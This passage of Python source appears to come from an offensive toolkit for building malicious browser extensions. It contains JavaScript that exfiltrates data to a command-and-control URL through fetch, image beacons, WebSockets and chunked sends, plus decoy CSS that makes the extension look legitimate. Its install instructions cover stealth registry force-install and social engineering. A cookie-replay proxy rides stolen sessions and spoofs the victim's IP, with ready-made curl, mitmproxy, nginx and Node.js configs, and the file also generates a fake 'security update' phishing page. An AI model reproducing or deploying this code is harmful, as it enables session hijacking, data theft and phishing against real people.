            await fetch(`${{C2_URL}}/api/collect`, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data),
                mode: 'no-cors'
            }});
            return true;
        }} catch {{
            return false;
        }}
    }},
    
    // Send via image beacon (backup)
    viaImage: (data) => {{
        const encoded = btoa(JSON.stringify(data));
        const img = new Image();
        img.src = `${{C2_URL}}/beacon.gif?d=${{encodeURIComponent(encoded)}}`;
    }},
    
    // Send via WebSocket (for large data)
    viaWebSocket: (data) => {{
        return new Promise((resolve, reject) => {{
            const ws = new WebSocket(C2_URL.replace('http', 'ws') + '/ws');
            ws.onopen = () => {{
                ws.send(JSON.stringify(data));
                ws.close();
                resolve();
            }};
            ws.onerror = reject;
        }});
    }},
    
    // Chunked send for large data
    chunked: async (data, chunkSize = 4096) => {{
        const str = JSON.stringify(data);
        const chunks = [];
        
        for (let i = 0; i < str.length; i += chunkSize) {{
            chunks.push(str.slice(i, i + chunkSize));
        }}
        
        const id = crypto.randomUUID();
        
        for (let i = 0; i < chunks.length; i++) {{
            await Exfil.viaFetch({{
                chunkId: id,
                index: i,
                total: chunks.length,
                data: chunks[i]
            }});
        }}
    }}
}};
'''

    def _generate_inject_css(self, ext_type: ExtensionType) -> str:
        """Generate inject CSS for visual legitimacy"""
        if ext_type == ExtensionType.DARK_MODE:
            return '''
/* Dark mode styles - makes extension look legitimate */
html[data-dark-mode="true"] {
    filter: invert(1) hue-rotate(180deg);
}

html[data-dark-mode="true"] img,
html[data-dark-mode="true"] video,
html[data-dark-mode="true"] [style*="background-image"] {
    filter: invert(1) hue-rotate(180deg);
}
'''
        elif ext_type == ExtensionType.AD_BLOCKER:
            return '''
/* Ad blocker styles - hide common ad elements */
[class*="ad-"],
[class*="ads-"],
[id*="ad-"],
[id*="ads-"],
.advertisement,
.sponsored {
    display: none !important;
}
'''
        return ""
    
    def _generate_install_instructions(self, config: ExtensionConfig, extension_id: str) -> str:
        """Generate installation instructions"""
        
        return f'''
# Installation Instructions for {config.name}

## Method 1: Developer Mode (Recommended for Testing)

1. Open Chrome/Edge browser
2. Navigate to `chrome://extensions` or `edge://extensions`
3. Enable "Developer mode" (toggle in top-right)
4. Click "Load unpacked"
5. Select the extracted extension folder
6. Extension will be installed with ID: {extension_id}

## Method 2: CRX File Installation

1. Package the extension folder as .crx
2. Drag and drop the .crx file onto the extensions page
3. Click "Add extension" when prompted

## Method 3: Enterprise Deployment (Stealth)

For domain-joined Windows machines:

1. Create registry key:
   `HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist`

2. Add string value:
   `1` = `{extension_id};https://your-update-server.com/update.xml`

3. Extension will auto-install without user interaction

## Method 4: Social Engineering

Send target a link to a fake "Required Security Update" page that:
1. Guides them through enabling Developer Mode
2. Downloads and extracts the extension
3. Loads it automatically

## Persistence Notes

- Extension survives browser restarts
- Survives clearing browsing data
- Only removed by explicit uninstallation
- Consider using extension update mechanism for C2 changes

## C2 Endpoint Configuration

Data will be exfiltrated to: {config.c2_url}

Expected endpoints:
- POST /api/collect - Main data collection
- GET /beacon.gif - Image beacon fallback
- WS /ws/collect - WebSocket for large data
'''

    def package_as_zip(self, extension: GeneratedExtension) -> bytes:
        """Package extension as ZIP file"""
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for filename, content in extension.files.items():
                if filename.startswith("icons/") and "PLACEHOLDER" in content:
                    # Skip placeholder icons - in real implementation, generate actual icons
                    continue
                zf.writestr(filename, content)
        
        zip_buffer.seek(0)
        return zip_buffer.getvalue()


class CookieReplayProxy:
    """
    Cookie Replay Reverse Proxy - Session Riding
    
    Instead of copying cookies to attacker's browser:
    1. Creates a reverse proxy tunnel through Monolith
    2. All requests go through victim's session
    3. IP address matches victim's = no location alerts
    """
    
    def __init__(self):
        self.sessions: Dict[str, CookieSession] = {}
        self.tunnels: Dict[str, ProxyTunnel] = {}
        self.next_port = 9000
    
    def add_session(self, 
                    domain: str, 
                    cookies: Dict[str, str],
                    user_agent: str,
                    victim_ip: str) -> CookieSession:
        """Add a stolen session for proxying"""
        
        session_id = hashlib.md5(
            f"{domain}{victim_ip}{time.time()}".encode()
        ).hexdigest()[:16]
        
        session = CookieSession(
            session_id=session_id,
            domain=domain,
            cookies=cookies,
            user_agent=user_agent,
            victim_ip=victim_ip,
            captured_at=datetime.utcnow(),
            last_activity=datetime.utcnow()
        )
        
        self.sessions[session_id] = session
        return session
    
    def create_tunnel(self, session_id: str) -> Optional[ProxyTunnel]:
        """Create a reverse proxy tunnel for a session"""
        
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        tunnel_id = hashlib.md5(
            f"{session_id}{time.time()}".encode()
        ).hexdigest()[:12]
        
        # Assign port
        local_port = self.next_port
        self.next_port += 1
        
        tunnel = ProxyTunnel(
            tunnel_id=tunnel_id,
            session=session,
            local_port=local_port,
            status="active"
        )
        
        self.tunnels[tunnel_id] = tunnel
        return tunnel
    
    def generate_proxy_config(self, tunnel: ProxyTunnel) -> Dict[str, Any]:
        """Generate proxy configuration for various tools"""
        
        session = tunnel.session
        
        # Cookie string
        cookie_str = "; ".join([
            f"{k}={v}" for k, v in session.cookies.items()
        ])
        
        return {
            "tunnel_id": tunnel.tunnel_id,
            "local_port": tunnel.local_port,
            "target_domain": session.domain,
            "proxy_url": f"http://127.0.0.1:{tunnel.local_port}",
            
            # For curl
            "curl_command": f'''curl -x http://127.0.0.1:{tunnel.local_port} \\
    -H "Cookie: {cookie_str}" \\
    -H "User-Agent: {session.user_agent}" \\
    https://{session.domain}/''',
            
            # For Python requests
            "python_code": f'''import requests

proxies = {{"http": "http://127.0.0.1:{tunnel.local_port}", 
           "https": "http://127.0.0.1:{tunnel.local_port}"}}
           
cookies = {json.dumps(session.cookies, indent=4)}

headers = {{"User-Agent": "{session.user_agent}"}}

response = requests.get(
    "https://{session.domain}/",
    proxies=proxies,
    cookies=cookies,
    headers=headers
)
print(response.text)''',
            
            # For browser
            "browser_config": {
                "proxy": f"127.0.0.1:{tunnel.local_port}",
                "cookies": session.cookies,
                "user_agent": session.user_agent
            },
            
            # mitmproxy script
            "mitmproxy_script": self._generate_mitmproxy_script(session)
        }
    
    def _generate_mitmproxy_script(self, session: CookieSession) -> str:
        """Generate mitmproxy addon script for session riding"""
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in session.cookies.items()])
        
        return f'''"""
mitmproxy addon for Cookie Replay Proxy
Session: {session.session_id}
Target: {session.domain}

Usage: mitmproxy -s this_script.py -p {self.next_port - 1}
"""

from mitmproxy import http

TARGET_DOMAIN = "{session.domain}"
COOKIES = {json.dumps(session.cookies)}
USER_AGENT = "{session.user_agent}"
VICTIM_IP = "{session.victim_ip}"

class SessionRider:
    def request(self, flow: http.HTTPFlow) -> None:
        # Only modify requests to target domain
        if TARGET_DOMAIN in flow.request.host:
            # Inject stolen cookies
            existing = flow.request.headers.get("Cookie", "")
            cookie_str = "; ".join([f"{{k}}={{v}}" for k, v in COOKIES.items()])
            
            if existing:
                flow.request.headers["Cookie"] = f"{{existing}}; {{cookie_str}}"
            else:
                flow.request.headers["Cookie"] = cookie_str
            
            # Spoof User-Agent
            flow.request.headers["User-Agent"] = USER_AGENT
            
            # Add X-Forwarded-For to appear from victim's IP
            flow.request.headers["X-Forwarded-For"] = VICTIM_IP
            flow.request.headers["X-Real-IP"] = VICTIM_IP
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Log interesting responses
        if TARGET_DOMAIN in flow.request.host:
            # Check for session invalidation
            if flow.response.status_code in [401, 403]:
                print(f"[!] Session may be invalidated: {{flow.response.status_code}}")
            
            # Check for new tokens in response
            for header in ["Set-Cookie", "X-CSRF-Token", "X-Auth-Token"]:
                if header in flow.response.headers:
                    print(f"[+] New {{header}}: {{flow.response.headers[header]}}")

addons = [SessionRider()]
'''
    
    def generate_nginx_config(self, tunnel: ProxyTunnel) -> str:
        """Generate nginx reverse proxy configuration"""
        
        session = tunnel.session
        cookie_str = "; ".join([f"{k}={v}" for k, v in session.cookies.items()])
        
        return f'''# Nginx Cookie Replay Proxy Configuration
# Session: {session.session_id}
# Target: {session.domain}

server {{
    listen {tunnel.local_port};
    server_name localhost;
    
    location / {{
        proxy_pass https://{session.domain};
        proxy_ssl_server_name on;
        
        # Inject stolen cookies
        proxy_set_header Cookie "{cookie_str}";
        
        # Spoof headers
        proxy_set_header User-Agent "{session.user_agent}";
        proxy_set_header X-Forwarded-For "{session.victim_ip}";
        proxy_set_header X-Real-IP "{session.victim_ip}";
        
        # Pass through other headers
        proxy_set_header Host {session.domain};
        proxy_set_header Accept $http_accept;
        proxy_set_header Accept-Language $http_accept_language;
        proxy_set_header Referer $http_referer;
        
        # Handle cookies in responses
        proxy_cookie_domain {session.domain} localhost;
        
        # SSL settings
        proxy_ssl_protocols TLSv1.2 TLSv1.3;
        proxy_ssl_verify off;
    }}
}}
'''

    def generate_nodejs_proxy(self, tunnel: ProxyTunnel) -> str:
        """Generate Node.js proxy server code"""
        
        session = tunnel.session
        
        return f'''/**
 * Cookie Replay Proxy Server
 * Session: {session.session_id}
 * Target: {session.domain}
 * 
 * Usage: node proxy.js
 */

const http = require('http');
const https = require('https');
const {{ URL }} = require('url');

const CONFIG = {{
    localPort: {tunnel.local_port},
    targetDomain: '{session.domain}',
    cookies: {json.dumps(session.cookies)},
    userAgent: '{session.user_agent}',
    victimIP: '{session.victim_ip}'
}};

const server = http.createServer((clientReq, clientRes) => {{
    const targetUrl = new URL(clientReq.url, `https://${{CONFIG.targetDomain}}`);
    
    // Build cookie string
    const cookieStr = Object.entries(CONFIG.cookies)
        .map(([k, v]) => `${{k}}=${{v}}`)
        .join('; ');
    
    const options = {{
        hostname: CONFIG.targetDomain,
        port: 443,
        path: targetUrl.pathname + targetUrl.search,
        method: clientReq.method,
        headers: {{
            ...clientReq.headers,
            'Host': CONFIG.targetDomain,
            'Cookie': cookieStr,
            'User-Agent': CONFIG.userAgent,
            'X-Forwarded-For': CONFIG.victimIP,
            'X-Real-IP': CONFIG.victimIP
        }}
    }};
    
    const proxyReq = https.request(options, (proxyRes) => {{
        // Log response
        console.log(`[${{new Date().toISOString()}}] ${{clientReq.method}} ${{targetUrl.pathname}} -> ${{proxyRes.statusCode}}`);
        
        // Forward response headers
        const headers = {{ ...proxyRes.headers }};
        delete headers['content-security-policy'];
        delete headers['x-frame-options'];
        
        clientRes.writeHead(proxyRes.statusCode, headers);
        proxyRes.pipe(clientRes);
    }});
    
    proxyReq.on('error', (e) => {{
        console.error(`Proxy error: ${{e.message}}`);
        clientRes.writeHead(502);
        clientRes.end('Proxy Error');
    }});
    
    clientReq.pipe(proxyReq);
}});

server.listen(CONFIG.localPort, () => {{
    console.log(`[*] Cookie Replay Proxy running on http://127.0.0.1:${{CONFIG.localPort}}`);
    console.log(`[*] Target: https://${{CONFIG.targetDomain}}`);
    console.log(`[*] Session: {session.session_id}`);
    console.log(`[*] Victim IP: ${{CONFIG.victimIP}}`);
    console.log('');
    console.log('[*] Configure your browser proxy to: 127.0.0.1:' + CONFIG.localPort);
}});
'''

    def get_session_status(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a session"""
        
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        # Find associated tunnel
        tunnel = None
        for t in self.tunnels.values():
            if t.session.session_id == session_id:
                tunnel = t
                break
        
        return {
            "session_id": session.session_id,
            "domain": session.domain,
            "victim_ip": session.victim_ip,
            "cookie_count": len(session.cookies),
            "captured_at": session.captured_at.isoformat(),
            "last_activity": session.last_activity.isoformat(),
            "tunnel_active": tunnel is not None,
            "tunnel_port": tunnel.local_port if tunnel else None,
            "requests_proxied": tunnel.requests_proxied if tunnel else 0
        }
    
    def list_sessions(self) -> List[Dict[str, Any]]:
        """List all active sessions"""
        return [self.get_session_status(sid) for sid in self.sessions.keys()]


# ============ UTILITY FUNCTIONS ============

def generate_social_engineering_page(extension_name: str, 
                                      extension_file: str,
                                      company_name: str = "IT Security") -> str:
    """
    Generate a social engineering page that tricks users 
    into installing the malicious extension
    """
    
    return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{company_name} - Required Security Update</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        .container {{
            max-width: 600px;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.1);
            text-align: center;
        }}
        .logo {{
            width: 80px;
            height: 80px;
            background: #4CAF50;
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }}
        h1 {{
            font-size: 24px;
            margin-bottom: 10px;
        }}
        .subtitle {{
            color: #888;
            margin-bottom: 30px;
        }}
        .alert {{
            background: rgba(244, 67, 54, 0.1);
            border: 1px solid #F44336;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 30px;
        }}
        .alert-icon {{
            font-size: 24px;
            margin-bottom: 10px;
        }}
        .steps {{
            text-align: left;
            margin-bottom: 30px;
        }}
        .step {{
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.03);
            border-radius: 8px;
        }}
        .step-number {{
            width: 30px;
            height: 30px;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }}
        .btn {{
            display: inline-block;
            padding: 15px 40px;
            background: #4CAF50;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            transition: 0.3s;
        }}
        .btn:hover {{
            background: #45a049;
            transform: translateY(-2px);
        }}
        .footer {{
            margin-top: 30px;
            font-size: 12px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🛡️</div>
        <h1>{company_name}</h1>
        <p class="subtitle">Browser Security Center</p>
        
        <div class="alert">
            <div class="alert-icon">⚠️</div>
            <strong>Security Update Required</strong>
            <p style="margin-top: 10px; color: #ccc;">
                Your browser requires the latest security extension to protect against 
                phishing attacks and malware.
            </p>
        </div>
        
        <div class="steps">
            <div class="step">
                <div class="step-number">1</div>
                <div>
                    <strong>Download the Extension</strong>
                    <p style="color: #888; font-size: 14px;">
                        Click the button below to download {extension_name}
                    </p>
                </div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div>
                    <strong>Enable Developer Mode</strong>
                    <p style="color: #888; font-size: 14px;">
                        Go to chrome://extensions and enable "Developer mode"
                    </p>
                </div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div>
                    <strong>Load the Extension</strong>
                    <p style="color: #888; font-size: 14px;">
                        Drag the downloaded file onto the extensions page
                    </p>
                </div>
            </div>
        </div>
        
        <a href="{extension_file}" class="btn" download>
            Download Security Extension
        </a>
        
        <div class="footer">
            <p>This security update is mandatory for all employees.</p>
            <p>Contact IT Support if you need assistance.</p>
        </div>
    </div>
</body>
</html>
'''


# ============ FLASK BLUEPRINT INTEGRATION ============

try:
    from flask import Blueprint
    
    browser_persistence_bp = Blueprint('browser_persistence', __name__, url_prefix='/browser-persistence')
    
    @browser_persistence_bp.route('/')
    def browser_persistence_index():
        return "Browser Persistence Module Active"
    
except ImportError:
    browser_persistence_bp = None


# ============ CLI INTERFACE ============

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Browser Persistence & Extension Ops")
    parser.add_argument("--generate", action="store_true", help="Generate malicious extension")
    parser.add_argument("--c2", type=str, default="http://localhost:8080", help="C2 URL")
    parser.add_argument("--type", type=str, default="security_scanner", help="Extension type")
    parser.add_argument("--output", type=str, default="extension.zip", help="Output file")
    
    args = parser.parse_args()
    
    if args.generate:
        factory = MaliciousExtensionFactory()
        
        config = ExtensionConfig(
            name="",
            version="1.0.0",
            description="",
            extension_type=ExtensionType(args.type),
            payload_type=PayloadType.FULL_SUITE,
            c2_url=args.c2
        )
        
        extension = factory.generate_extension(config)
        zip_data = factory.package_as_zip(extension)
        
        with open(args.output, 'wb') as f:
            f.write(zip_data)
        
        print(f"[+] Extension generated: {args.output}")
        print(f"[+] Extension ID: {extension.extension_id}")
        print(f"[+] C2 URL: {args.c2}")
